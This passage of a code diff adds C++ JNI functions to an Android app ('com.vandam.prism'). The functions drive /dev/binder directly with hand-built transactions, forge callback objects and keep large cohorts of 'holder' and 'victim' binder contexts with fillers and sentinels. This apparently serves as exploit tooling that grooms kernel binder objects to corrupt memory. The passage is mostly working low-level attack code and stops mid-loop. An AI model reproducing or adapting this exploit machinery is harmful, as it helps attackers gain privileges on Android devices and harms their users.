+                        sizeof(cookie));
+                return cookie == expected_cookie;
+            }
+            cursor += payload_size;
+        }
+    }
+    return false;
+}
+
+}  // namespace
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_rawBinderRouteProbe(
+        JNIEnv* environment, jclass, jobject service_manager_parcel,
+        jobject start_service_parcel, jlong callback_pointer,
+        jlong callback_cookie, jboolean retain_context) {
+    constexpr std::size_t kBinderMappingSize = 1024 * 1024;
+    constexpr std::uint32_t kServiceManagerGetService = 1;
+    constexpr std::uint32_t kActivityManagerStartService = 34;
+    constexpr std::uint32_t kBrokerCallbackCode = 0x42b0;
+    constexpr std::uint32_t kBrokerProof = 0x50524252;
+    constexpr char kMarkerDescriptor[] =
+            "com.vandam.prism.RawBrokerMarker";
+    const auto started = std::chrono::steady_clock::now();
+
+    PlatformParcelView service_manager;
+    PlatformParcelView start_service;
+    bool service_template = inspect_platform_parcel(
+            environment, service_manager_parcel, &service_manager);
+    bool start_template = inspect_platform_parcel(
+            environment, start_service_parcel, &start_service);
+    if (!service_template || !start_template ||
+            service_manager.object_count != 0 ||
+            start_service.object_count == 0 || callback_pointer == 0 ||
+            callback_cookie == 0) {
+        char state[320];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=raw-binder-route reason=template"
+                " service_valid=%d service_size=%zu service_objects=%zu"
+                " start_valid=%d start_size=%zu start_objects=%zu"
+                " pointer=%" PRIx64 " cookie=%" PRIx64,
+                service_template ? 1 : 0, service_manager.data_size,
+                service_manager.object_count, start_template ? 1 : 0,
+                start_service.data_size, start_service.object_count,
+                static_cast<std::uint64_t>(callback_pointer),
+                static_cast<std::uint64_t>(callback_cookie));
+        return environment->NewStringUTF(state);
+    }
+    std::vector<std::uint8_t> start_data(
+            start_service.data,
+            start_service.data + start_service.data_size);
+    std::vector<binder_size_t> start_offsets(
+            start_service.object_offsets,
+            start_service.object_offsets + start_service.object_count);
+    std::array<std::uint64_t, 2> callback_identity {};
+    callback_identity[0] = reinterpret_cast<std::uintptr_t>(
+            &callback_identity[0]);
+    callback_identity[1] = reinterpret_cast<std::uintptr_t>(
+            &callback_identity[1]);
+    int replaced = 0;
+    for (binder_size_t offset : start_offsets) {
+        flat_binder_object object {};
+        std::memcpy(&object, start_data.data() + offset, sizeof(object));
+        if (object.hdr.type == BINDER_TYPE_BINDER &&
+                object.binder == static_cast<binder_uintptr_t>(
+                        callback_pointer) &&
+                object.cookie == static_cast<binder_uintptr_t>(
+                        callback_cookie)) {
+            object.binder = static_cast<binder_uintptr_t>(
+                    callback_identity[0]);
+            object.cookie = static_cast<binder_uintptr_t>(
+                    callback_identity[1]);
+            std::memcpy(start_data.data() + offset, &object,
+                    sizeof(object));
+            ++replaced;
+        }
+    }
+    if (replaced != 1) {
+        char state[192];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=raw-binder-route reason=callback-object"
+                " objects=%zu replaced=%d",
+                start_offsets.size(), replaced);
+        return environment->NewStringUTF(state);
+    }
+
+    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
+    binder_version version {};
+    void* mapping = MAP_FAILED;
+    if (fd >= 0 && ioctl(fd, BINDER_VERSION, &version) == 0 &&
+            version.protocol_version == 8) {
+        mapping = mmap(nullptr, kBinderMappingSize, PROT_READ,
+                MAP_PRIVATE | MAP_NORESERVE, fd, 0);
+    }
+    if (fd < 0 || mapping == MAP_FAILED) {
+        int saved_errno = errno;
+        if (fd >= 0) {
+            close(fd);
+        }
+        char state[192];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=raw-binder-route reason=context"
+                " errno=%d protocol=%d",
+                saved_errno, version.protocol_version);
+        return environment->NewStringUTF(state);
+    }
+
+    binder_transaction_data get_service {};
+    get_service.target.handle = 0;
+    get_service.code = kServiceManagerGetService;
+    get_service.data_size = service_manager.data_size;
+    get_service.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
+            service_manager.data);
+    BinderReply service_reply = transact_and_read(fd, get_service);
+    int activity_handle = -1;
+    if (service_reply.buffer != 0 &&
+            service_reply.offsets_size >= sizeof(binder_size_t)) {
+        binder_size_t offset = 0;
+        std::memcpy(&offset, reinterpret_cast<const void*>(
+                service_reply.offsets), sizeof(offset));
+        if (offset <= service_reply.data_size &&
+                service_reply.data_size - offset >=
+                        sizeof(flat_binder_object)) {
+            flat_binder_object object {};
+            std::memcpy(&object,
+                    reinterpret_cast<const std::uint8_t*>(
+                            service_reply.buffer) + offset,
+                    sizeof(object));
+            if (object.hdr.type == BINDER_TYPE_HANDLE) {
+                activity_handle = static_cast<int>(object.handle);
+            }
+        }
+    }
+    if (activity_handle <= 0) {
+        if (service_reply.buffer != 0) {
+            free_buffer(fd, service_reply.buffer);
+        }
+        munmap(mapping, kBinderMappingSize);
+        close(fd);
+        char state[256];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=raw-binder-route reason=activity"
+                " ioctl=%d errno=%d terminal=%08" PRIx32
+                " data=%" PRIu64 " offsets=%" PRIu64,
+                service_reply.ioctl_result, service_reply.ioctl_errno,
+                service_reply.terminal_response,
+                static_cast<std::uint64_t>(service_reply.data_size),
+                static_cast<std::uint64_t>(service_reply.offsets_size));
+        return environment->NewStringUTF(state);
+    }
+
+    binder_transaction_data start {};
+    start.target.handle = static_cast<std::uint32_t>(activity_handle);
+    start.code = kActivityManagerStartService;
+    start.data_size = start_data.size();
+    start.offsets_size = start_offsets.size() * sizeof(binder_size_t);
+    start.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
+            start_data.data());
+    start.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
+            start_offsets.data());
+    BinderReply start_reply = transact_and_read(fd, start);
+    std::int32_t exception = INT32_MIN;
+    if (start_reply.buffer != 0 &&
+            start_reply.data_size >= sizeof(exception)) {
+        std::memcpy(&exception,
+                reinterpret_cast<const void*>(start_reply.buffer),
+                sizeof(exception));
+    }
+    bool start_pass = start_reply.ioctl_result == 0 &&
+            start_reply.buffer != 0 && exception == 0;
+    std::uint32_t enter_looper = BC_ENTER_LOOPER;
+    bool entered = start_pass &&
+            write_binder_commands(fd, &enter_looper,
+                    sizeof(enter_looper)) == 0;
+    int original_flags = fcntl(fd, F_GETFL, 0);
+    bool nonblocking = entered && original_flags >= 0 &&
+            fcntl(fd, F_SETFL, original_flags | O_NONBLOCK) == 0;
+    binder_uintptr_t callback_buffer = 0;
+    int marker_handle = -1;
+    int target_handle = -1;
+    std::uint32_t callback_prefix = 0;
+    bool callback_target = false;
+    auto deadline = std::chrono::steady_clock::now() +
+            std::chrono::seconds(5);
+    while (nonblocking && std::chrono::steady_clock::now() < deadline &&
+            marker_handle <= 0) {
+        pollfd descriptor {fd, POLLIN, 0};
+        auto remaining = std::chrono::duration_cast<
+                std::chrono::milliseconds>(deadline -
+                        std::chrono::steady_clock::now()).count();
+        int poll_result = poll(&descriptor, 1,
+                static_cast<int>(std::max<std::int64_t>(1, remaining)));
+        if (poll_result < 0 && errno == EINTR) {
+            continue;
+        }
+        if (poll_result <= 0) {
+            break;
+        }
+        std::uint8_t read_buffer[4096] {};
+        binder_write_read request {};
+        request.read_size = sizeof(read_buffer);
+        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
+                read_buffer);
+        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
+            if (errno == EINTR || errno == EAGAIN) {
+                continue;
+            }
+            break;
+        }
+        for (std::size_t cursor = 0;
+             cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
+            std::uint32_t response = 0;
+            std::memcpy(&response, read_buffer + cursor,
+                    sizeof(response));
+            cursor += sizeof(response);
+            std::size_t payload_size = _IOC_SIZE(response);
+            if (cursor + payload_size > request.read_consumed) {
+                cursor = request.read_consumed;
+                break;
+            }
+            if (response == BR_TRANSACTION &&
+                    payload_size >= sizeof(binder_transaction_data)) {
+                binder_transaction_data transaction {};
+                std::memcpy(&transaction, read_buffer + cursor,
+                        sizeof(transaction));
+                callback_target = transaction.code == kBrokerCallbackCode &&
+                        transaction.target.ptr == callback_identity[0] &&
+                        transaction.cookie == callback_identity[1];
+                if (callback_target && transaction.data_size >=
+                            sizeof(callback_prefix) &&
+                        transaction.offsets_size >= sizeof(binder_size_t)) {
+                    const auto* data = reinterpret_cast<const std::uint8_t*>(
+                            transaction.data.ptr.buffer);
+                    std::memcpy(&callback_prefix, data,
+                            sizeof(callback_prefix));
+                    std::size_t object_count =
+                            transaction.offsets_size /
+                            sizeof(binder_size_t);
+                    const auto* object_offsets =
+                            reinterpret_cast<const binder_size_t*>(
+                                    transaction.data.ptr.offsets);
+                    for (std::size_t object_index = 0;
+                         object_index < object_count; ++object_index) {
+                        binder_size_t object_offset =
+                                object_offsets[object_index];
+                        if (object_offset > transaction.data_size ||
+                                transaction.data_size - object_offset <
+                                        sizeof(flat_binder_object)) {
+                            marker_handle = -1;
+                            target_handle = -1;
+                            break;
+                        }
+                        flat_binder_object object {};
+                        std::memcpy(&object, data + object_offset,
+                                sizeof(object));
+                        if (object.hdr.type == BINDER_TYPE_HANDLE) {
+                            if (object_index == 0) {
+                                marker_handle =
+                                        static_cast<int>(object.handle);
+                            } else if (object_index == 1) {
+                                target_handle =
+                                        static_cast<int>(object.handle);
+                            }
+                        }
+                    }
+                    if (marker_handle > 0) {
+                        callback_buffer = transaction.data.ptr.buffer;
+                    }
+                }
+            }
+            cursor += payload_size;
+        }
+    }
+    if (original_flags >= 0) {
+        fcntl(fd, F_SETFL, original_flags);
+    }
+    std::string descriptor = marker_handle > 0
+            ? query_descriptor(fd, marker_handle) : std::string();
+    bool pass = start_pass && entered && nonblocking && callback_target &&
+            callback_prefix == kBrokerProof && marker_handle > 0 &&
+            descriptor == kMarkerDescriptor;
+    bool retained = false;
+    std::size_t held_total = 0;
+    if (pass && retain_context == JNI_TRUE) {
+        if (callback_buffer != 0) {
+            if (target_handle > 0) {
+                constexpr std::size_t kHandleCommandSize =
+                        sizeof(std::uint32_t) + sizeof(std::uint32_t);
+                constexpr std::size_t kFreeCommandSize =
+                        sizeof(std::uint32_t) +
+                        sizeof(binder_uintptr_t);
+                std::uint8_t commands[
+                        2 * kHandleCommandSize + kFreeCommandSize] {};
+                write_command(commands, BC_INCREFS, &target_handle,
+                        sizeof(target_handle));
+                write_command(commands + kHandleCommandSize,
+                        BC_ACQUIRE, &target_handle,
+                        sizeof(target_handle));
+                write_command(commands + 2 * kHandleCommandSize,
+                        BC_FREE_BUFFER, &callback_buffer,
+                        sizeof(callback_buffer));
+                pass = write_binder_commands(
+                        fd, commands, sizeof(commands)) == 0;
+            } else {
+                pass = free_buffer(fd, callback_buffer);
+            }
+            callback_buffer = 0;
+        }
+    }
+    if (start_reply.buffer != 0) {
+        free_buffer(fd, start_reply.buffer);
+    }
+    if (service_reply.buffer != 0) {
+        free_buffer(fd, service_reply.buffer);
+    }
+    if (pass && retain_context == JNI_TRUE) {
+        std::lock_guard<std::mutex> lock(g_retained_raw_route_mutex);
+        if (pass && g_retained_raw_routes.size() < 128) {
+            RetainedRawBinderRoute route;
+            route.fd = fd;
+            route.mapping = mapping;
+            route.callback_pointer = callback_identity[0];
+            route.callback_cookie = callback_identity[1];
+            route.target_handle = target_handle;
+            if (target_handle > 0) {
+                route.holder_handles.push_back(
+                        static_cast<std::uint32_t>(target_handle));
+            }
+            g_retained_raw_routes.push_back(std::move(route));
+            retained = true;
+            held_total = g_retained_raw_routes.size();
+        } else {
+            pass = false;
+        }
+    }
+    if (!retained) {
+        if (callback_buffer != 0) {
+            free_buffer(fd, callback_buffer);
+        }
+        munmap(mapping, kBinderMappingSize);
+        close(fd);
+    }
+    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(
+            std::chrono::steady_clock::now() - started).count();
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-binder-route context=independent"
+            " activity_handle=%d start_exception=%" PRId32
+            " start_terminal=%08" PRIx32 " entered=%d nonblocking=%d"
+            " callback_target=%d callback_prefix=%08" PRIx32
+            " marker_handle=%d target_handle=%d descriptor=%s"
+            " retained=%d held_total=%zu"
+            " duration_us=%" PRId64,
+            pass ? "pass" : "fail", activity_handle, exception,
+            start_reply.terminal_response, entered ? 1 : 0,
+            nonblocking ? 1 : 0, callback_target ? 1 : 0,
+            callback_prefix, marker_handle, target_handle,
+            descriptor.empty() ? "none" : descriptor.c_str(),
+            retained ? 1 : 0, held_total,
+            static_cast<std::int64_t>(duration));
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_startRawBinderHolderRoutes(
+        JNIEnv* environment, jclass, jstring java_service_template_path,
+        jstring java_start_template_path, jint expected_holders,
+        jint index_sentinel) {
+    const char* service_template_path =
+            java_service_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_service_template_path, nullptr);
+    const char* start_template_path =
+            java_start_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_start_template_path, nullptr);
+    prism::primitive::Result result;
+    bool preflight = service_template_path != nullptr &&
+            start_template_path != nullptr &&
+            (expected_holders == 128 || expected_holders == 256 ||
+             expected_holders == 384 || expected_holders == 512) &&
+            index_sentinel > 0;
+    {
+        std::lock_guard<std::mutex> retained_lock(
+                g_retained_raw_route_mutex);
+        preflight = preflight && g_retained_raw_routes.empty();
+    }
+    {
+        std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+        preflight = preflight && g_holder_cohort == nullptr;
+        if (preflight) {
+            g_holder_cohort = prism::primitive::HolderCohort::create(
+                    service_template_path, start_template_path,
+                    expected_holders, index_sentinel, &result);
+        }
+    }
+    if (start_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_start_template_path, start_template_path);
+    }
+    if (service_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_service_template_path, service_template_path);
+    }
+    bool pass = preflight && result.passed;
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-binder-holder-routes"
+            " expected=%d core=[%s]",
+            pass ? "pass" : "fail", expected_holders,
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_startRawVictimExports(
+        JNIEnv* environment, jclass, jstring java_service_template_path,
+        jstring java_start_template_path, jint expected_victims) {
+    const auto started = std::chrono::steady_clock::now();
+    const char* service_template_path =
+            java_service_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_service_template_path, nullptr);
+    const char* start_template_path =
+            java_start_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_start_template_path, nullptr);
+    prism::primitive::Result result;
+    bool preflight = service_template_path != nullptr &&
+            start_template_path != nullptr &&
+            expected_victims == kRawVictimCount - 1;
+    bool cohort_created = false;
+    {
+        std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+        preflight = preflight && g_victim_cohort == nullptr;
+        if (preflight) {
+            g_victim_cohort = prism::primitive::VictimCohort::create(
+                    service_template_path, start_template_path,
+                    expected_victims, &result);
+        }
+        cohort_created = g_victim_cohort != nullptr;
+    }
+    if (start_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_start_template_path, start_template_path);
+    }
+    if (service_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_service_template_path, service_template_path);
+    }
+    bool pass = preflight && cohort_created && result.passed;
+    std::uint64_t duration_us = static_cast<std::uint64_t>(
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    std::chrono::steady_clock::now() - started).count());
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-victim-export-start"
+            " expected=%d duration_us=%" PRIu64 " core=[%s]",
+            pass ? "pass" : "fail", expected_victims, duration_us,
+            result.detail.empty() ? "status=fail reason=preflight" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jlongArray JNICALL
+Java_com_vandam_prism_NativeBridge_collectRawVictimExports(
+        JNIEnv* environment, jclass, jint expected_victims) {
+    std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+    bool pass = expected_victims == kRawVictimCount - 1 &&
+            g_victim_cohort != nullptr;
+    std::vector<prism::primitive::VictimToken> core_tokens;
+    prism::primitive::Result collected;
+    if (pass) {
+        collected = g_victim_cohort->collect(&core_tokens);
+        pass = collected.passed && core_tokens.size() ==
+                static_cast<std::size_t>(expected_victims);
+    }
+    std::vector<jlong> tokens;
+    if (pass) {
+        tokens.reserve(static_cast<std::size_t>(expected_victims) * 2);
+        for (const prism::primitive::VictimToken& token : core_tokens) {
+            tokens.push_back(static_cast<jlong>(token.pointer));
+            tokens.push_back(static_cast<jlong>(token.cookie));
+        }
+    }
+    jsize length = pass
+            ? static_cast<jsize>(tokens.size()) : 0;
+    jlongArray result = environment->NewLongArray(length);
+    if (result != nullptr && length > 0) {
+        environment->SetLongArrayRegion(
+                result, 0, length, tokens.data());
+    }
+    return result;
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_queueAndRetireRawVictimContext(
+        JNIEnv* environment, jclass, jint victim) {
+    constexpr useconds_t kRawVictimRetirementSettleUs = 20000;
+    std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+    prism::primitive::Result result;
+    if (g_victim_cohort != nullptr) {
+        result = g_victim_cohort->retire(
+                victim, kRawVictimRetirementSettleUs);
+    }
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-client-exit mode=native-context"
+            " victim=%d core=[%s]",
+            result.passed ? "pass" : "fail", victim,
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_releaseRawVictimContexts(
+        JNIEnv* environment, jclass, jint expected_victims) {
+    std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+    prism::primitive::Result result;
+    bool preflight = expected_victims == kRawVictimCount - 1 &&
+            g_victim_cohort != nullptr;
+    if (preflight) {
+        result = g_victim_cohort->release();
+    }
+    bool pass = preflight && result.passed;
+    g_victim_cohort.reset();
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-victim-context-release"
+            " expected=%d core=[%s]",
+            pass ? "pass" : "fail", expected_victims,
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_releaseRawBinderRouteProbes(
+        JNIEnv* environment, jclass) {
+    constexpr std::size_t kBinderMappingSize = 1024 * 1024;
+    {
+        std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+        if (g_holder_cohort != nullptr) {
+            prism::primitive::HolderReleaseReceipt counts;
+            prism::primitive::Result result =
+                    g_holder_cohort->release(&counts);
+            g_holder_cohort.reset();
+            bool pass = result.passed;
+            {
+                std::lock_guard<std::mutex> isolated_lock(
+                        g_raw_isolated_mutex);
+                if (g_raw_isolated_state ==
+                            IsolatedRetirementState::kCollecting ||
+                        g_raw_isolated_state ==
+                            IsolatedRetirementState::kReferencesReleased) {
+                    g_raw_route_release_receipt.generation =
+                            g_raw_isolated_generation;
+                    g_raw_route_release_receipt.contexts = counts.contexts;
+                    g_raw_route_release_receipt.handles = counts.handles;
+                    g_raw_route_release_receipt.death_notifications =
+                            counts.death_notifications;
+                    g_raw_route_release_receipt.mappings = counts.mappings;
+                    g_raw_route_release_receipt.descriptors =
+                            counts.descriptors;
+                    g_raw_route_release_receipt.valid = pass &&
+                            valid_raw_route_release_profile(
+                                    counts.contexts,
+                                    counts.handles,
+                                    counts.death_notifications) &&
+                            counts.mappings == counts.contexts &&
+                            counts.descriptors == counts.contexts;
+                }
+            }
+            char state[640];
+            std::snprintf(state, sizeof(state),
+                    "status=%s stage=raw-binder-route-release"
+                    " retained=%d handles_released=%d"
+                    " deaths_cleared=%d unmapped=%d closed=%d"
+                    " core=[%s]",
+                    pass ? "pass" : "fail", counts.contexts,
+                    counts.handles, counts.death_notifications,
+                    counts.mappings, counts.descriptors,
+                    result.detail.c_str());
+            return environment->NewStringUTF(state);
+        }
+    }
+    std::vector<RetainedRawBinderRoute> routes;
+    {
+        std::lock_guard<std::mutex> lock(g_retained_raw_route_mutex);
+        routes.swap(g_retained_raw_routes);
+    }
+    int buffers = 0;
+    int handles_released = 0;
+    int expected_handles = 0;
+    int deaths_cleared = 0;
+    int expected_deaths = 0;
+    int unmapped = 0;
+    int closed = 0;
+    for (RetainedRawBinderRoute& route : routes) {
+        expected_handles += static_cast<int>(route.holder_handles.size());
+        expected_deaths += static_cast<int>(
+                route.death_notifications.size());
+        std::uint32_t enter_looper = BC_ENTER_LOOPER;
+        bool handles_ok = write_binder_commands(route.fd, &enter_looper,
+                sizeof(enter_looper)) == 0;
+        for (const binder_handle_cookie& death :
+             route.death_notifications) {
+            std::uint8_t command[sizeof(std::uint32_t) +
+                    sizeof(death)] {};
+            write_command(command, BC_CLEAR_DEATH_NOTIFICATION,
+                    &death, sizeof(death));
+            if (write_binder_commands(route.fd, command,
+                        sizeof(command)) != 0 ||
+                    !drain_raw_clear_death(route.fd, death.cookie)) {
+                handles_ok = false;
+                break;
+            }
+            ++deaths_cleared;
+        }
+        for (std::uint32_t handle : route.holder_handles) {
+            if (!handles_ok) {
+                break;
+            }
+            std::uint8_t commands[
+                    2 * (sizeof(std::uint32_t) + sizeof(handle))] {};
+            write_command(commands, BC_RELEASE, &handle, sizeof(handle));
+            write_command(commands + sizeof(std::uint32_t) + sizeof(handle),
+                    BC_DECREFS, &handle, sizeof(handle));
+            if (write_binder_commands(route.fd, commands,
+                        sizeof(commands)) != 0) {
+                handles_ok = false;
+                break;
+            }
+            ++handles_released;
+        }
+        if (route.fd >= 0 && route.callback_buffer != 0 &&
+                free_buffer(route.fd, route.callback_buffer)) {
+            ++buffers;
+        }
+        if (route.mapping != MAP_FAILED &&
+                munmap(route.mapping, kBinderMappingSize) == 0) {
+            ++unmapped;
+        }
+        if (route.fd >= 0 && close(route.fd) == 0) {
+            ++closed;
+        }
+        if (!handles_ok) {
+            closed = -1;
+        }
+    }
+    int expected_buffers = 0;
+    for (const RetainedRawBinderRoute& route : routes) {
+        expected_buffers += route.callback_buffer != 0 ? 1 : 0;
+    }
+    bool pass = !routes.empty() && buffers == expected_buffers &&
+            deaths_cleared == expected_deaths &&
+            handles_released == expected_handles &&
+            unmapped == static_cast<int>(routes.size()) &&
+            closed == static_cast<int>(routes.size());
+    {
+        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
+        if (g_raw_isolated_state ==
+                    IsolatedRetirementState::kCollecting ||
+                g_raw_isolated_state ==
+                    IsolatedRetirementState::kReferencesReleased) {
+            g_raw_route_release_receipt.generation =
+                    g_raw_isolated_generation;
+            g_raw_route_release_receipt.contexts =
+                    static_cast<int>(routes.size());
+            g_raw_route_release_receipt.handles = handles_released;
+            g_raw_route_release_receipt.death_notifications =
+                    deaths_cleared;
+            g_raw_route_release_receipt.mappings = unmapped;
+            g_raw_route_release_receipt.descriptors = closed;
+            g_raw_route_release_receipt.valid = pass &&
+                    valid_raw_route_release_profile(
+                            static_cast<int>(routes.size()),
+                            handles_released, deaths_cleared) &&
+                    unmapped == static_cast<int>(routes.size()) &&
+                    closed == static_cast<int>(routes.size());
+        }
+    }
+    char state[320];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-binder-route-release retained=%zu"
+            " buffers=%d expected_buffers=%d handles_released=%d"
+            " expected_handles=%d"
+            " deaths_cleared=%d expected_deaths=%d"
+            " unmapped=%d closed=%d",
+            pass ? "pass" : "fail", routes.size(), buffers,
+            expected_buffers, handles_released, expected_handles,
+            deaths_cleared, expected_deaths,
+            unmapped, closed);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_proveRawBinderHoldersRetired(
+        JNIEnv* environment, jclass, jlong generation, jint contexts,
+        jint callback_deaths) {
+    bool published = false;
+    RawRouteReleaseReceipt receipt;
+    {
+        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
+        receipt = g_raw_route_release_receipt;
+        bool current = generation > 0 &&
+                static_cast<std::uint64_t>(generation) ==
+                        g_raw_isolated_generation &&
+                receipt.generation == g_raw_isolated_generation;
+        published = current &&
+                (g_raw_isolated_state ==
+                            IsolatedRetirementState::kCollecting ||
+                        g_raw_isolated_state ==
+                            IsolatedRetirementState::kReferencesReleased) &&
+                receipt.valid && contexts > 0 &&
+                callback_deaths == contexts &&
+                receipt.contexts == contexts &&
+                valid_raw_route_release_profile(
+                        receipt.contexts,
+                        receipt.handles,
+                        receipt.death_notifications) &&
+                receipt.mappings == contexts &&
+                receipt.descriptors == contexts;
+        if (published) {
+            g_raw_isolated_pids.clear();
+            g_raw_isolated_historical_total = contexts;
+            g_raw_isolated_historical_retired = callback_deaths;
+            g_raw_isolated_retirement_proved = true;
+            g_raw_context_retirement_proved = true;
+            g_raw_isolated_state = IsolatedRetirementState::kProved;
+        } else if (current) {
+            g_raw_isolated_historical_total = 0;
+            g_raw_isolated_historical_retired = 0;
+            g_raw_isolated_retirement_proved = false;
+            g_raw_context_retirement_proved = false;
+            g_raw_isolated_state = IsolatedRetirementState::kFailed;
+        }
+    }
+    char state[512];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-holder-retirement-proof"
+            " generation=%" PRIu64 " contexts=%d callbacks=%d"
+            " release_valid=%d release_contexts=%d handles=%d"
+            " death_notifications=%d mappings=%d descriptors=%d",
+            published ? "pass" : "fail",
+            static_cast<std::uint64_t>(generation), contexts,
+            callback_deaths, receipt.valid ? 1 : 0, receipt.contexts,
+            receipt.handles, receipt.death_notifications,
+            receipt.mappings, receipt.descriptors);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_receiveRawBinderHolderRefs(
+        JNIEnv* environment, jclass, jint expected_holders,
+        jint fixed_refs_per_holder, jint expected_proof,
+        jint death_object_index) {
+    constexpr std::uint32_t kHolderCode = 0x42b1;
+    constexpr std::int32_t kFillerMinimum = 20;
+    constexpr std::int32_t kFillerVariants = 8;
+    const auto started = std::chrono::steady_clock::now();
+    {
+        std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+        if (g_holder_cohort != nullptr) {
+            prism::primitive::Result result =
+                    (expected_holders == 8 || expected_holders == 128 ||
+                     expected_holders == 256 || expected_holders == 384 ||
+                     expected_holders == 512)
+                    ? g_holder_cohort->receive(
+                            expected_holders, fixed_refs_per_holder,
+                            expected_proof, death_object_index)
+                    : prism::primitive::Result {};
+            bool pass = (expected_holders == 8 ||
+                         expected_holders == 128 ||
+                         expected_holders == 256 ||
+                         expected_holders == 384 ||
+                         expected_holders == 512) && result.passed;
+            char state[640];
+            std::snprintf(state, sizeof(state),
+                    "status=%s stage=raw-binder-holder-refs"
+                    " requested=%d death_index=%d core=[%s]",
+                    pass ? "pass" : "fail", expected_holders,
+                    death_object_index,
+                    result.detail.empty()
+                            ? "status=fail reason=cohort" :
+                            result.detail.c_str());
+            return environment->NewStringUTF(state);
+        }
+    }
+    std::lock_guard<std::mutex> lock(g_retained_raw_route_mutex);
+    bool dynamic_counts = fixed_refs_per_holder == 0;
+    bool interleaved_marker = fixed_refs_per_holder == -1;
+    bool counts_valid = expected_holders > 0 && expected_holders <= 128 &&
+            fixed_refs_per_holder >= -1 && fixed_refs_per_holder <= 256 &&
+            expected_proof > 0 &&
+            death_object_index >= -2 &&
+            (!dynamic_counts ||
+             (expected_holders >= kFillerVariants &&
+              expected_holders % kFillerVariants == 0));
+    if (!counts_valid ||
+            g_retained_raw_routes.size() !=
+                    static_cast<std::size_t>(expected_holders)) {
+        char state[192];
+        std::snprintf(state, sizeof(state),
+                "status=fail stage=raw-binder-holder-refs"
+                " reason=routes count=%zu",
+                g_retained_raw_routes.size());
+        return environment->NewStringUTF(state);
+    }
+    int received = 0;
+    int handles = 0;
+    int expected_handles = 0;
+    int completions = 0;
+    int failed_index = -1;
+    for (std::size_t index = 0;
+         index < g_retained_raw_routes.size(); ++index) {
+        RetainedRawBinderRoute& route = g_retained_raw_routes[index];
+        std::int32_t expected_count = interleaved_marker
+                ? (index % (expected_holders / 8) == 0 ? 2 : 1)
+                : dynamic_counts
+                ? kFillerMinimum + static_cast<std::int32_t>(index) /
+                        (expected_holders / kFillerVariants) +
+                        (death_object_index == -1 ? 1 : 2)
+                : fixed_refs_per_holder;
+        int death_index = interleaved_marker
+                ? (expected_count == 2 ? 1 : -1)
+                : death_object_index == -2
+                ? expected_count - 1 : death_object_index;
+        if (death_index >= expected_count) {
+            failed_index = static_cast<int>(index);
+            break;
+        }
+        expected_handles += expected_count;
+        std::uint32_t enter_looper = BC_ENTER_LOOPER;
+        if (write_binder_commands(route.fd, &enter_looper,
+                    sizeof(enter_looper)) != 0) {
+            failed_index = static_cast<int>(index);
+            break;
+        }
+        auto deadline = std::chrono::steady_clock::now() +
+                std::chrono::seconds(5);
+        bool found = false;
+        while (!found && std::chrono::steady_clock::now() < deadline) {
+            pollfd descriptor {route.fd, POLLIN, 0};
+            auto remaining = std::chrono::duration_cast<
+                    std::chrono::milliseconds>(deadline -
+                            std::chrono::steady_clock::now()).count();
+            int poll_result = poll(&descriptor, 1,
+                    static_cast<int>(std::max<std::int64_t>(1, remaining)));
+            if (poll_result < 0 && errno == EINTR) {
+                continue;
+            }
+            if (poll_result <= 0) {
+                break;
